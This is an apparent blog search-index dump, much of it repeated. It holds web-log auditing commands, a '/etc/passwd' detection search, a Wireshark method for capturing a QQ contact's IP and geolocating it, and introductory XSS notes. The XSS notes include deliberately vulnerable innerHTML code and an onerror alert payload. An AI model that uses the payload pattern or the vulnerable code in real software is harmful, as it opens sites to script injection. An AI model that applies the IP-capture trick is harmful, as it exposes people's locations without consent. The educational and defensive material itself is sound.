或找出文件大于10MB的文件： cat access_log | awk '($10 \u003e 10000000 \u0026\u0026 $7 ~/.exe){print $7}' | sort -n | uniq -c | sort -nr | head -10 简单统计流量 cat access_log | awk '{sum+=$10}' 统计401访问拒绝的数量 cat access_log | awk '(/401/)' | wc -l 查看某一时间内的IP连接情况 grep \"2022:04\" access_log | awk '{print $4}' | sort | uniq -c | sort -nr ","date":"2023-11-17","objectID":"/log_analysis/:1:3","series":null,"tags":["web"],"title":"web流量审计与日志分析","uri":"/log_analysis/#web日志统计"},{"categories":["web"],"content":"\rWeb日志统计:\r查看访问IP cat access_log | awk '{print $1}' awk ‘{print $1}’ - 每行按空格或TAB分割，输出文本中的第1项，因为在access_log中的IP是第一项，所以这里用$1表示 打印每一重复行出现的次数 cat access_log | awk '{print $1}' | sort | uniq -c uniq用于检查及删除文本中重复出现的行列，一般与sort结合使用 -c - 在每列旁边显示该行重复出现的次数 排序并统计行数 cat access_log | awk '{print $1}' | sort | uniq -c | sort -rn | wc -l sort 用于对文本文件内容进行排序，默认以ASCII码的次序排列 -r 以相反的顺序来排序 -n 依照数值的大小排序 wc用于打印文件的文本行数、单词数、字节数等 -l 打印指定文件的文本行数 显示访问前10位的IP地址 cat access_log | awk '{print $1}' | sort | uniq -c | sort -rn | heade -10 显示指定时间以后的日志 cat access_log | awk '$4\u003e=\"[10/Apr/2022:01:00:01]\"' access_log 找出访问量最大的IP，并封掉 cat access_log | awk '{print $1}' | sort | uniq -c | sort -rn | more iptables -I INPUT -s 192.168.1.10 -j DROP iptables -I INPUT -s 192.168.1.0/24 -j DROP 找出下载最多的文件 cat access_log | awk '($7 ~/.exe/){print $10 \"\" $1 \"\" $4 \"\" $7}' | sort -n | uniq -c | sort -nr | head -10 或找出文件大于10MB的文件： cat access_log | awk '($10 \u003e 10000000 \u0026\u0026 $7 ~/.exe){print $7}' | sort -n | uniq -c | sort -nr | head -10 简单统计流量 cat access_log | awk '{sum+=$10}' 统计401访问拒绝的数量 cat access_log | awk '(/401/)' | wc -l 查看某一时间内的IP连接情况 grep \"2022:04\" access_log | awk '{print $4}' | sort | uniq -c | sort -nr ","date":"2023-11-17","objectID":"/log_analysis/:1:3","series":null,"tags":["web"],"title":"web流量审计与日志分析","uri":"/log_analysis/#查看访问ip"},{"categories":["web"],"content":"\rWeb日志统计:\r查看访问IP cat access_log | awk '{print $1}' awk ‘{print $1}’ - 每行按空格或TAB分割，输出文本中的第1项，因为在access_log中的IP是第一项，所以这里用$1表示 打印每一重复行出现的次数 cat access_log | awk '{print $1}' | sort | uniq -c uniq用于检查及删除文本中重复出现的行列，一般与sort结合使用 -c - 在每列旁边显示该行重复出现的次数 排序并统计行数 cat access_log | awk '{print $1}' | sort | uniq -c | sort -rn | wc -l sort 用于对文本文件内容进行排序，默认以ASCII码的次序排列 -r 以相反的顺序来排序 -n 依照数值的大小排序 wc用于打印文件的文本行数、单词数、字节数等 -l 打印指定文件的文本行数 显示访问前10位的IP地址 cat access_log | awk '{print $1}' | sort | uniq -c | sort -rn | heade -10 显示指定时间以后的日志 cat access_log | awk '$4\u003e=\"[10/Apr/2022:01:00:01]\"' access_log 找出访问量最大的IP，并封掉 cat access_log | awk '{print $1}' | sort | uniq -c | sort -rn | more iptables -I INPUT -s 192.168.1.10 -j DROP iptables -I INPUT -s 192.168.1.0/24 -j DROP 找出下载最多的文件 cat access_log | awk '($7 ~/.exe/){print $10 \"\" $1 \"\" $4 \"\" $7}' | sort -n | uniq -c | sort -nr | head -10 或找出文件大于10MB的文件： cat access_log | awk '($10 \u003e 10000000 \u0026\u0026 $7 ~/.exe){print $7}' | sort -n | uniq -c | sort -nr | head -10 简单统计流量 cat access_log | awk '{sum+=$10}' 统计401访问拒绝的数量 cat access_log | awk '(/401/)' | wc -l 查看某一时间内的IP连接情况 grep \"2022:04\" access_log | awk '{print $4}' | sort | uniq -c | sort -nr ","date":"2023-11-17","objectID":"/log_analysis/:1:3","series":null,"tags":["web"],"title":"web流量审计与日志分析","uri":"/log_analysis/#打印每一重复行出现的次数"},{"categories":["web"],"content":"\rWeb日志统计:\r查看访问IP cat access_log | awk '{print $1}' awk ‘{print $1}’ - 每行按空格或TAB分割，输出文本中的第1项，因为在access_log中的IP是第一项，所以这里用$1表示 打印每一重复行出现的次数 cat access_log | awk '{print $1}' | sort | uniq -c uniq用于检查及删除文本中重复出现的行列，一般与sort结合使用 -c - 在每列旁边显示该行重复出现的次数 排序并统计行数 cat access_log | awk '{print $1}' | sort | uniq -c | sort -rn | wc -l sort 用于对文本文件内容进行排序，默认以ASCII码的次序排列 -r 以相反的顺序来排序 -n 依照数值的大小排序 wc用于打印文件的文本行数、单词数、字节数等 -l 打印指定文件的文本行数 显示访问前10位的IP地址 cat access_log | awk '{print $1}' | sort | uniq -c | sort -rn | heade -10 显示指定时间以后的日志 cat access_log | awk '$4\u003e=\"[10/Apr/2022:01:00:01]\"' access_log 找出访问量最大的IP，并封掉 cat access_log | awk '{print $1}' | sort | uniq -c | sort -rn | more iptables -I INPUT -s 192.168.1.10 -j DROP iptables -I INPUT -s 192.168.1.0/24 -j DROP 找出下载最多的文件 cat access_log | awk '($7 ~/.exe/){print $10 \"\" $1 \"\" $4 \"\" $7}' | sort -n | uniq -c | sort -nr | head -10 或找出文件大于10MB的文件： cat access_log | awk '($10 \u003e 10000000 \u0026\u0026 $7 ~/.exe){print $7}' | sort -n | uniq -c | sort -nr | head -10 简单统计流量 cat access_log | awk '{sum+=$10}' 统计401访问拒绝的数量 cat access_log | awk '(/401/)' | wc -l 查看某一时间内的IP连接情况 grep \"2022:04\" access_log | awk '{print $4}' | sort | uniq -c | sort -nr ","date":"2023-11-17","objectID":"/log_analysis/:1:3","series":null,"tags":["web"],"title":"web流量审计与日志分析","uri":"/log_analysis/#显示访问前10位的ip地址"},{"categories":["web"],"content":"\rWeb日志统计:\r查看访问IP cat access_log | awk '{print $1}' awk ‘{print $1}’ - 每行按空格或TAB分割，输出文本中的第1项，因为在access_log中的IP是第一项，所以这里用$1表示 打印每一重复行出现的次数 cat access_log | awk '{print $1}' | sort | uniq -c uniq用于检查及删除文本中重复出现的行列，一般与sort结合使用 -c - 在每列旁边显示该行重复出现的次数 排序并统计行数 cat access_log | awk '{print $1}' | sort | uniq -c | sort -rn | wc -l sort 用于对文本文件内容进行排序，默认以ASCII码的次序排列 -r 以相反的顺序来排序 -n 依照数值的大小排序 wc用于打印文件的文本行数、单词数、字节数等 -l 打印指定文件的文本行数 显示访问前10位的IP地址 cat access_log | awk '{print $1}' | sort | uniq -c | sort -rn | heade -10 显示指定时间以后的日志 cat access_log | awk '$4\u003e=\"[10/Apr/2022:01:00:01]\"' access_log 找出访问量最大的IP，并封掉 cat access_log | awk '{print $1}' | sort | uniq -c | sort -rn | more iptables -I INPUT -s 192.168.1.10 -j DROP iptables -I INPUT -s 192.168.1.0/24 -j DROP 找出下载最多的文件 cat access_log | awk '($7 ~/.exe/){print $10 \"\" $1 \"\" $4 \"\" $7}' | sort -n | uniq -c | sort -nr | head -10 或找出文件大于10MB的文件： cat access_log | awk '($10 \u003e 10000000 \u0026\u0026 $7 ~/.exe){print $7}' | sort -n | uniq -c | sort -nr | head -10 简单统计流量 cat access_log | awk '{sum+=$10}' 统计401访问拒绝的数量 cat access_log | awk '(/401/)' | wc -l 查看某一时间内的IP连接情况 grep \"2022:04\" access_log | awk '{print $4}' | sort | uniq -c | sort -nr ","date":"2023-11-17","objectID":"/log_analysis/:1:3","series":null,"tags":["web"],"title":"web流量审计与日志分析","uri":"/log_analysis/#显示指定时间以后的日志"},{"categories":["web"],"content":"\rWeb日志统计:\r查看访问IP cat access_log | awk '{print $1}' awk ‘{print $1}’ - 每行按空格或TAB分割，输出文本中的第1项，因为在access_log中的IP是第一项，所以这里用$1表示 打印每一重复行出现的次数 cat access_log | awk '{print $1}' | sort | uniq -c uniq用于检查及删除文本中重复出现的行列，一般与sort结合使用 -c - 在每列旁边显示该行重复出现的次数 排序并统计行数 cat access_log | awk '{print $1}' | sort | uniq -c | sort -rn | wc -l sort 用于对文本文件内容进行排序，默认以ASCII码的次序排列 -r 以相反的顺序来排序 -n 依照数值的大小排序 wc用于打印文件的文本行数、单词数、字节数等 -l 打印指定文件的文本行数 显示访问前10位的IP地址 cat access_log | awk '{print $1}' | sort | uniq -c | sort -rn | heade -10 显示指定时间以后的日志 cat access_log | awk '$4\u003e=\"[10/Apr/2022:01:00:01]\"' access_log 找出访问量最大的IP，并封掉 cat access_log | awk '{print $1}' | sort | uniq -c | sort -rn | more iptables -I INPUT -s 192.168.1.10 -j DROP iptables -I INPUT -s 192.168.1.0/24 -j DROP 找出下载最多的文件 cat access_log | awk '($7 ~/.exe/){print $10 \"\" $1 \"\" $4 \"\" $7}' | sort -n | uniq -c | sort -nr | head -10 或找出文件大于10MB的文件： cat access_log | awk '($10 \u003e 10000000 \u0026\u0026 $7 ~/.exe){print $7}' | sort -n | uniq -c | sort -nr | head -10 简单统计流量 cat access_log | awk '{sum+=$10}' 统计401访问拒绝的数量 cat access_log | awk '(/401/)' | wc -l 查看某一时间内的IP连接情况 grep \"2022:04\" access_log | awk '{print $4}' | sort | uniq -c | sort -nr ","date":"2023-11-17","objectID":"/log_analysis/:1:3","series":null,"tags":["web"],"title":"web流量审计与日志分析","uri":"/log_analysis/#找出访问量最大的ip并封掉"},{"categories":["web"],"content":"\rWeb日志统计:\r查看访问IP cat access_log | awk '{print $1}' awk ‘{print $1}’ - 每行按空格或TAB分割，输出文本中的第1项，因为在access_log中的IP是第一项，所以这里用$1表示 打印每一重复行出现的次数 cat access_log | awk '{print $1}' | sort | uniq -c uniq用于检查及删除文本中重复出现的行列，一般与sort结合使用 -c - 在每列旁边显示该行重复出现的次数 排序并统计行数 cat access_log | awk '{print $1}' | sort | uniq -c | sort -rn | wc -l sort 用于对文本文件内容进行排序，默认以ASCII码的次序排列 -r 以相反的顺序来排序 -n 依照数值的大小排序 wc用于打印文件的文本行数、单词数、字节数等 -l 打印指定文件的文本行数 显示访问前10位的IP地址 cat access_log | awk '{print $1}' | sort | uniq -c | sort -rn | heade -10 显示指定时间以后的日志 cat access_log | awk '$4\u003e=\"[10/Apr/2022:01:00:01]\"' access_log 找出访问量最大的IP，并封掉 cat access_log | awk '{print $1}' | sort | uniq -c | sort -rn | more iptables -I INPUT -s 192.168.1.10 -j DROP iptables -I INPUT -s 192.168.1.0/24 -j DROP 找出下载最多的文件 cat access_log | awk '($7 ~/.exe/){print $10 \"\" $1 \"\" $4 \"\" $7}' | sort -n | uniq -c | sort -nr | head -10 或找出文件大于10MB的文件： cat access_log | awk '($10 \u003e 10000000 \u0026\u0026 $7 ~/.exe){print $7}' | sort -n | uniq -c | sort -nr | head -10 简单统计流量 cat access_log | awk '{sum+=$10}' 统计401访问拒绝的数量 cat access_log | awk '(/401/)' | wc -l 查看某一时间内的IP连接情况 grep \"2022:04\" access_log | awk '{print $4}' | sort | uniq -c | sort -nr ","date":"2023-11-17","objectID":"/log_analysis/:1:3","series":null,"tags":["web"],"title":"web流量审计与日志分析","uri":"/log_analysis/#找出下载最多的文件"},{"categories":["web"],"content":"\rWeb日志统计:\r查看访问IP cat access_log | awk '{print $1}' awk ‘{print $1}’ - 每行按空格或TAB分割，输出文本中的第1项，因为在access_log中的IP是第一项，所以这里用$1表示 打印每一重复行出现的次数 cat access_log | awk '{print $1}' | sort | uniq -c uniq用于检查及删除文本中重复出现的行列，一般与sort结合使用 -c - 在每列旁边显示该行重复出现的次数 排序并统计行数 cat access_log | awk '{print $1}' | sort | uniq -c | sort -rn | wc -l sort 用于对文本文件内容进行排序，默认以ASCII码的次序排列 -r 以相反的顺序来排序 -n 依照数值的大小排序 wc用于打印文件的文本行数、单词数、字节数等 -l 打印指定文件的文本行数 显示访问前10位的IP地址 cat access_log | awk '{print $1}' | sort | uniq -c | sort -rn | heade -10 显示指定时间以后的日志 cat access_log | awk '$4\u003e=\"[10/Apr/2022:01:00:01]\"' access_log 找出访问量最大的IP，并封掉 cat access_log | awk '{print $1}' | sort | uniq -c | sort -rn | more iptables -I INPUT -s 192.168.1.10 -j DROP iptables -I INPUT -s 192.168.1.0/24 -j DROP 找出下载最多的文件 cat access_log | awk '($7 ~/.exe/){print $10 \"\" $1 \"\" $4 \"\" $7}' | sort -n | uniq -c | sort -nr | head -10 或找出文件大于10MB的文件： cat access_log | awk '($10 \u003e 10000000 \u0026\u0026 $7 ~/.exe){print $7}' | sort -n | uniq -c | sort -nr | head -10 简单统计流量 cat access_log | awk '{sum+=$10}' 统计401访问拒绝的数量 cat access_log | awk '(/401/)' | wc -l 查看某一时间内的IP连接情况 grep \"2022:04\" access_log | awk '{print $4}' | sort | uniq -c | sort -nr ","date":"2023-11-17","objectID":"/log_analysis/:1:3","series":null,"tags":["web"],"title":"web流量审计与日志分析","uri":"/log_analysis/#简单统计流量"},{"categories":["web"],"content":"\rWeb日志统计:\r查看访问IP cat access_log | awk '{print $1}' awk ‘{print $1}’ - 每行按空格或TAB分割，输出文本中的第1项，因为在access_log中的IP是第一项，所以这里用$1表示 打印每一重复行出现的次数 cat access_log | awk '{print $1}' | sort | uniq -c uniq用于检查及删除文本中重复出现的行列，一般与sort结合使用 -c - 在每列旁边显示该行重复出现的次数 排序并统计行数 cat access_log | awk '{print $1}' | sort | uniq -c | sort -rn | wc -l sort 用于对文本文件内容进行排序，默认以ASCII码的次序排列 -r 以相反的顺序来排序 -n 依照数值的大小排序 wc用于打印文件的文本行数、单词数、字节数等 -l 打印指定文件的文本行数 显示访问前10位的IP地址 cat access_log | awk '{print $1}' | sort | uniq -c | sort -rn | heade -10 显示指定时间以后的日志 cat access_log | awk '$4\u003e=\"[10/Apr/2022:01:00:01]\"' access_log 找出访问量最大的IP，并封掉 cat access_log | awk '{print $1}' | sort | uniq -c | sort -rn | more iptables -I INPUT -s 192.168.1.10 -j DROP iptables -I INPUT -s 192.168.1.0/24 -j DROP 找出下载最多的文件 cat access_log | awk '($7 ~/.exe/){print $10 \"\" $1 \"\" $4 \"\" $7}' | sort -n | uniq -c | sort -nr | head -10 或找出文件大于10MB的文件： cat access_log | awk '($10 \u003e 10000000 \u0026\u0026 $7 ~/.exe){print $7}' | sort -n | uniq -c | sort -nr | head -10 简单统计流量 cat access_log | awk '{sum+=$10}' 统计401访问拒绝的数量 cat access_log | awk '(/401/)' | wc -l 查看某一时间内的IP连接情况 grep \"2022:04\" access_log | awk '{print $4}' | sort | uniq -c | sort -nr ","date":"2023-11-17","objectID":"/log_analysis/:1:3","series":null,"tags":["web"],"title":"web流量审计与日志分析","uri":"/log_analysis/#统计401访问拒绝的数量"},{"categories":["web"],"content":"\rWeb日志统计:\r查看访问IP cat access_log | awk '{print $1}' awk ‘{print $1}’ - 每行按空格或TAB分割，输出文本中的第1项，因为在access_log中的IP是第一项，所以这里用$1表示 打印每一重复行出现的次数 cat access_log | awk '{print $1}' | sort | uniq -c uniq用于检查及删除文本中重复出现的行列，一般与sort结合使用 -c - 在每列旁边显示该行重复出现的次数 排序并统计行数 cat access_log | awk '{print $1}' | sort | uniq -c | sort -rn | wc -l sort 用于对文本文件内容进行排序，默认以ASCII码的次序排列 -r 以相反的顺序来排序 -n 依照数值的大小排序 wc用于打印文件的文本行数、单词数、字节数等 -l 打印指定文件的文本行数 显示访问前10位的IP地址 cat access_log | awk '{print $1}' | sort | uniq -c | sort -rn | heade -10 显示指定时间以后的日志 cat access_log | awk '$4\u003e=\"[10/Apr/2022:01:00:01]\"' access_log 找出访问量最大的IP，并封掉 cat access_log | awk '{print $1}' | sort | uniq -c | sort -rn | more iptables -I INPUT -s 192.168.1.10 -j DROP iptables -I INPUT -s 192.168.1.0/24 -j DROP 找出下载最多的文件 cat access_log | awk '($7 ~/.exe/){print $10 \"\" $1 \"\" $4 \"\" $7}' | sort -n | uniq -c | sort -nr | head -10 或找出文件大于10MB的文件： cat access_log | awk '($10 \u003e 10000000 \u0026\u0026 $7 ~/.exe){print $7}' | sort -n | uniq -c | sort -nr | head -10 简单统计流量 cat access_log | awk '{sum+=$10}' 统计401访问拒绝的数量 cat access_log | awk '(/401/)' | wc -l 查看某一时间内的IP连接情况 grep \"2022:04\" access_log | awk '{print $4}' | sort | uniq -c | sort -nr ","date":"2023-11-17","objectID":"/log_analysis/:1:3","series":null,"tags":["web"],"title":"web流量审计与日志分析","uri":"/log_analysis/#查看某一时间内的ip连接情况"},{"categories":["web"],"content":"\r错误日志分析:默认的错误日志位置/var/log/httpd/error_log 错误日志记录了服务器运行期间遇到的各种故障，以及一些普通的诊断信息，如服务器启动/关闭的时间 日志文件记录信息级别的高低，控制日志文件记录信息的数量和类型，这是通过LogLevel指令实现的，该指令默认设置的级别是error 级别越高，记录的信息越多，日志量越大 最常见的错误日志文件有两类： 文档错误 文档错误和服务器应答中的400系列代码对应，最常见的是404错误 CGI错误 CGI程序输出到STDERR(Standard Error,标准错误设备)的所有内容都将直接进入错误日志 日志截图中画出的部分是Mozi僵尸网络的攻击payload，具体请看： https://blog.netlab.360.com/p2p-botnet-mozi/ https://cloud.tencent.com/developer/article/1708178 ","date":"2023-11-17","objectID":"/log_analysis/:1:4","series":null,"tags":["web"],"title":"web流量审计与日志分析","uri":"/log_analysis/#错误日志分析"},{"categories":["web"],"content":"\r日志行为分析：\r检索包含关键词为“Hello World”的请求：\r检索包含关键词为“/etc/passwd”的请求：很明显是本地文件包含尝试 ","date":"2023-11-17","objectID":"/log_analysis/:2:0","series":null,"tags":["web"],"title":"web流量审计与日志分析","uri":"/log_analysis/#日志行为分析"},{"categories":["web"],"content":"\r日志行为分析：\r检索包含关键词为“Hello World”的请求：\r检索包含关键词为“/etc/passwd”的请求：很明显是本地文件包含尝试 ","date":"2023-11-17","objectID":"/log_analysis/:2:0","series":null,"tags":["web"],"title":"web流量审计与日志分析","uri":"/log_analysis/#检索包含关键词为hello-world的请求"},{"categories":["web"],"content":"\r日志行为分析：\r检索包含关键词为“Hello World”的请求：\r检索包含关键词为“/etc/passwd”的请求：很明显是本地文件包含尝试 ","date":"2023-11-17","objectID":"/log_analysis/:2:0","series":null,"tags":["web"],"title":"web流量审计与日志分析","uri":"/log_analysis/#检索包含关键词为etcpasswd的请求"},{"categories":["tricks"],"content":"WireShark监听QQ通信数据获取对方IP ","date":"2023-11-17","objectID":"/wireshark_capture_qq_ip/:0:0","series":null,"tags":["tricks"],"title":"WireShark监听QQ通信数据获取对方IP","uri":"/wireshark_capture_qq_ip/#"},{"categories":["tricks"],"content":"\r只是一个有趣的小把戏\r一、打开Wireshark对目前的网络接口进行监听随后打开QQ，给你的朋友打QQ电话，当对方接听后即可挂断，顺便停止Wireshark的捕获 二、在Wireshark中按组合键Ctrl+F调出控制菜单查找020048，同时选择选择“分组详情”——“字符串” 这里利用的原理： UDP是QQ传输使用的协议 020048为 QQ所使用UDP协议的报文头 可多次点击找符合条件的记录，一般会有两种ip地址记录，一种是自己的局域网ip，另一种是对方的公网ip 打语音和视频是直接能和对方建立连接，如果发文件，是直接发给腾讯的，抓不到包 三、在ip定位网站进行定位https://www.chaipip.com/ip.php 经过测试发现，只要对方在线，即便是没接电话也能监听到对方IP，但移动网络定位精度比较差，目前没有找到更高精度的定位方法 ","date":"2023-11-17","objectID":"/wireshark_capture_qq_ip/:1:0","series":null,"tags":["tricks"],"title":"WireShark监听QQ通信数据获取对方IP","uri":"/wireshark_capture_qq_ip/#只是一个有趣的小把戏"},{"categories":["tricks"],"content":"\r只是一个有趣的小把戏\r一、打开Wireshark对目前的网络接口进行监听随后打开QQ，给你的朋友打QQ电话，当对方接听后即可挂断，顺便停止Wireshark的捕获 二、在Wireshark中按组合键Ctrl+F调出控制菜单查找020048，同时选择选择“分组详情”——“字符串” 这里利用的原理： UDP是QQ传输使用的协议 020048为 QQ所使用UDP协议的报文头 可多次点击找符合条件的记录，一般会有两种ip地址记录，一种是自己的局域网ip，另一种是对方的公网ip 打语音和视频是直接能和对方建立连接，如果发文件，是直接发给腾讯的，抓不到包 三、在ip定位网站进行定位https://www.chaipip.com/ip.php 经过测试发现，只要对方在线，即便是没接电话也能监听到对方IP，但移动网络定位精度比较差，目前没有找到更高精度的定位方法 ","date":"2023-11-17","objectID":"/wireshark_capture_qq_ip/:1:0","series":null,"tags":["tricks"],"title":"WireShark监听QQ通信数据获取对方IP","uri":"/wireshark_capture_qq_ip/#一打开wireshark对目前的网络接口进行监听"},{"categories":["tricks"],"content":"\r只是一个有趣的小把戏\r一、打开Wireshark对目前的网络接口进行监听随后打开QQ，给你的朋友打QQ电话，当对方接听后即可挂断，顺便停止Wireshark的捕获 二、在Wireshark中按组合键Ctrl+F调出控制菜单查找020048，同时选择选择“分组详情”——“字符串” 这里利用的原理： UDP是QQ传输使用的协议 020048为 QQ所使用UDP协议的报文头 可多次点击找符合条件的记录，一般会有两种ip地址记录，一种是自己的局域网ip，另一种是对方的公网ip 打语音和视频是直接能和对方建立连接，如果发文件，是直接发给腾讯的，抓不到包 三、在ip定位网站进行定位https://www.chaipip.com/ip.php 经过测试发现，只要对方在线，即便是没接电话也能监听到对方IP，但移动网络定位精度比较差，目前没有找到更高精度的定位方法 ","date":"2023-11-17","objectID":"/wireshark_capture_qq_ip/:1:0","series":null,"tags":["tricks"],"title":"WireShark监听QQ通信数据获取对方IP","uri":"/wireshark_capture_qq_ip/#二在wireshark中按组合键ctrlf调出控制菜单"},{"categories":["tricks"],"content":"\r只是一个有趣的小把戏\r一、打开Wireshark对目前的网络接口进行监听随后打开QQ，给你的朋友打QQ电话，当对方接听后即可挂断，顺便停止Wireshark的捕获 二、在Wireshark中按组合键Ctrl+F调出控制菜单查找020048，同时选择选择“分组详情”——“字符串” 这里利用的原理： UDP是QQ传输使用的协议 020048为 QQ所使用UDP协议的报文头 可多次点击找符合条件的记录，一般会有两种ip地址记录，一种是自己的局域网ip，另一种是对方的公网ip 打语音和视频是直接能和对方建立连接，如果发文件，是直接发给腾讯的，抓不到包 三、在ip定位网站进行定位https://www.chaipip.com/ip.php 经过测试发现，只要对方在线，即便是没接电话也能监听到对方IP，但移动网络定位精度比较差，目前没有找到更高精度的定位方法 ","date":"2023-11-17","objectID":"/wireshark_capture_qq_ip/:1:0","series":null,"tags":["tricks"],"title":"WireShark监听QQ通信数据获取对方IP","uri":"/wireshark_capture_qq_ip/#三在ip定位网站进行定位"},{"categories":["notes"],"content":"XSS基础初学笔记 ","date":"2023-11-17","objectID":"/xss/:0:0","series":null,"tags":["notes"],"title":"XSS","uri":"/xss/#"},{"categories":["notes"],"content":"\r0x1 简介跨站脚本（cross site script）为了避免与样式css混淆，所以简称为XSS,是web中最主流的攻击方式。 XSS 攻击指黑客通过特殊的手段往网页中插入了恶意的 JavaScript 脚本，从而在用户浏览网页时，对用户浏览器发起 Cookie 资料窃取、会话劫持、钓鱼欺骗等各攻击。 XSS 跨站脚本攻击本身对 Web 服务器没有直接危害，它借助网站进行传播，使网站的大量用户受到攻击。攻击者一般通过留言、电子邮件或其他途径向受害者发送一个精心构造的恶意 URL，当受害者在 Web 浏览器中打开该URL的时侯，恶意脚本会在受害者的计算机上悄悄执行。 XSS漏洞普遍流行的原因: Web 浏览器本身的设计不安全，无法判断 JS 代码是否是恶意的 输入与输出的 Web 应用程序基本交互防护不够 程序员缺乏安全意识，缺少对 XSS 漏洞的认知 XSS 触发简单，完全防御起来相当困难 XSS攻击的危害: 网络钓鱼 盗取用户 cookies 信息 劫持用户浏览器 强制弹出广告页面、刷流量 网页挂马 进行恶意操作，例如任意篡改页面信息 获取客户端隐私信息 控制受害者机器向其他网站发起攻击 结合其他漏洞，如 CSRF 漏洞，实施进一步作恶 提升用户权限，包括进一步渗透网站 传播跨站脚本蠕虫等 ","date":"2023-11-17","objectID":"/xss/:1:0","series":null,"tags":["notes"],"title":"XSS","uri":"/xss/#0x1-简介"},{"categories":["notes"],"content":"\r0x2 跨站脚本实例下面的 HTML 代码就演示了一个最基本的 XSS 弹窗： \u003chtml\u003e \u003cbody\u003e \u003cscript\u003ealert(1)\u003c/script\u003e \u003c/body\u003e \u003c/html\u003e ","date":"2023-11-17","objectID":"/xss/:2:0","series":null,"tags":["notes"],"title":"XSS","uri":"/xss/#0x2-跨站脚本实例"},{"categories":["notes"],"content":"\r0x3 分类\r(1)反射型XSS（非持久型）反射型XSS只是简单的把用户输入的数据从服务器反射给用户浏览器，要利用这个漏洞，攻击者必须以某种方式诱导用户访问一个精心设计的URL（恶意链接），才能实施攻击。 漏洞成因当用户的输入或者一些用户可控参数未经处理地输出到页面上，就容易产生XSS漏洞。主要场景有以下几种： 将不可信数据插入到HTML标签之间时；// 例如div, p, td； 将不可信数据插入到HTML属性里时；// 例如：\u003cdiv width=$INPUT\u003e\u003c/div\u003e 将不可信数据插入到SCRIPT里时；// 例如：\u003cscript\u003evar message = ” $INPUT “;\u003c/script\u003e 还有插入到Style属性里的情况，同样具有一定的危害性；// 例如\u003cspan style=” property : $INPUT ”\u003e\u003c/span\u003e 将不可信数据插入到HTML URL里时，// 例如：\u003ca href=”[http://www.abcd.com?param=](http://www.ccc.com/?param=) $INPUT ”\u003e\u003c/a\u003e 使用富文本时，没有使用XSS规则引擎进行编码过滤。 攻击流程反射型XSS通常出现在搜索等功能中，需要被攻击者点击对应的链接才能触发，且受到XSS Auditor(chrome内置的XSS保护)、NoScript等防御手段的影响较大，所以它的危害性较存储型要小。 (2)存储型XSS（持久型）\r漏洞成因存储型XSS漏洞的成因与反射型的根源类似，不同的是恶意代码会被保存在服务器中，导致其它用户（前端）和管理员（前后端）在访问资源时执行了恶意代码，用户访问服务器-跨站链接-返回跨站代码。 攻击流程\r(3)DOM型XSS输入的恶意代码不会经过服务器，在前端被js代码直接读取放置到前端的标签中，是一 种特殊的反射型XSS。 漏洞成因DOM型XSS是基于DOM文档对象模型的。对于浏览器来说，DOM文档就是一份XML文档，当有了这个标准的技术之后，通过JavaScript就可以轻松的访问DOM。当确认客户端代码中有DOM型XSS漏洞时，诱使(钓鱼)一名用户访问自己构造的URL，利用步骤和反射型很类似，但是唯一的区别就是，构造的URL参数不用发送到服务器端，可以达到绕过WAF、躲避服务端的检测效果。 下面编写一个简单的含有 DOM XSS漏洞的 HTML 代码： \u003cmeta charset=\"UTF-8\"\u003e \u003cscript\u003e function xss(){ var str = document.getElementById(\"src\").value; document.getElementById(\"demo\").innerHTML = \"\u003cimg src='\"+str+\"' /\u003e\"; } \u003c/script\u003e \u003cinput type=\"text\" id=\"src\" size=\"50\" placeholder=\"输入图片地址\" /\u003e \u003cinput type=\"button\" value=\"插入\" onclick=\"xss()\" /\u003e\u003cbr\u003e \u003cdiv id=\"demo\" \u003e\u003c/div\u003e 用户输入框插入图片地址后，页面会将图片插入在id=“demo” 的 div 标签中，从而显示在网页上： 同样，这里也没有对用户的输入进入过滤，当攻击者构造如下语句插入的时候： \u003cimg src=\"1\" onerror=\"alert(1)\"\u003e 会直接在img标签中插入onerror事件，该语句表示当图片加载出错的时候，自动触发后面的 alert()函数，来达到弹窗的效果，这就是一个最简单的 DOM 型 XSS 漏洞。 (4)通用型XSS通用型XSS，也叫做UXSS或者Universal XSS，全称Universal Cross-Site Scripting。 上面三种XSS攻击的是因为客户端或服务端的代码开发不严谨等问题而存在漏洞的目标网站或者应用程序。这些攻击的先决条件是访问页面存在漏洞，但是UXSS是一种利用浏览器或者浏览器扩展漏洞来制造产生XSS的条件并执行代码的一种攻击类型。 漏洞成因Web浏览器是正在使用的最流行的应用程序之一，当一个新漏洞被发现的时候，不管自己利用还是说报告给官方，而这个过程中都有一段不小的时间，这一过程中漏洞都可能被利用于UXSS。 不仅是浏览器本身的漏洞，现在主流浏览器都支持扩展程序的安装，而众多的浏览器扩展程序可能导致带来更多的漏洞和安全问题。因为UXSS攻击不需要网站页面本身存在漏洞，同时可能访问其他安全无漏洞页面，使得UXSS成为XSS里危险和最具破坏性的攻击类型之一。 漏洞案例IE6或火狐浏览器扩展程序Adobe Acrobat的漏洞 这是一个比较经典的例子。当使用扩展程序时导致错误，使得代码可以执行。这是一个在pdf阅读器中的bug，允许攻击者在客户端执行脚本。构造恶意页面，写入恶意脚本，并利用扩展程序打开pdf时运行代码。tefano Di Paola 和 Giorgio Fedon在一个在Mozilla Firefox浏览器Adobe Reader的插件中可利用的缺陷中第一个记录和描述的UXSS，Adobe插件通过一系列参数允许从外部数据源取数据进行文档表单的填充，如果没有正确的执行，将允许跨站脚本攻击。 (5)突变型XSS突变型XSS，也叫做mXSS或，全称Mutation-based Cross-Site-Scripting。（mutation，突变，来自遗传学的一个单词，大家都知道的基因突变，gene mutation） 漏洞成因然而，如果用户所提供的富文本内容通过javascript代码进入innerHTML属性后，一些意外的变化会使得这个认定不再成立：浏览器的渲染引擎会将本来没有任何危害的HTML代码渲染成具有潜在危险的XSS攻击代码。 随后，该段攻击代码，可能会被JS代码中的其它一些流程输出到DOM中或是其它方式被再次渲染，从而导致XSS的执行。 这种由于HTML内容进入innerHTML后发生意外变化，而最终导致XSS的攻击流程。 攻击流程将拼接的内容置于innerHTML这种操作，在现在的WEB应用代码中十分常见，常见的WEB应用中很多都使用了innerHTML属性，这将会导致潜在的mXSS攻击。从浏览器角度来讲，mXSS对三大主流浏览器（IE，CHROME，FIREFOX）均有影响。 ","date":"2023-11-17","objectID":"/xss/:3:0","series":null,"tags":["notes"],"title":"XSS","uri":"/xss/#0x3-分类"},{"categories":["notes"],"content":"\r0x3 分类\r(1)反射型XSS（非持久型）反射型XSS只是简单的把用户输入的数据从服务器反射给用户浏览器，要利用这个漏洞，攻击者必须以某种方式诱导用户访问一个精心设计的URL（恶意链接），才能实施攻击。 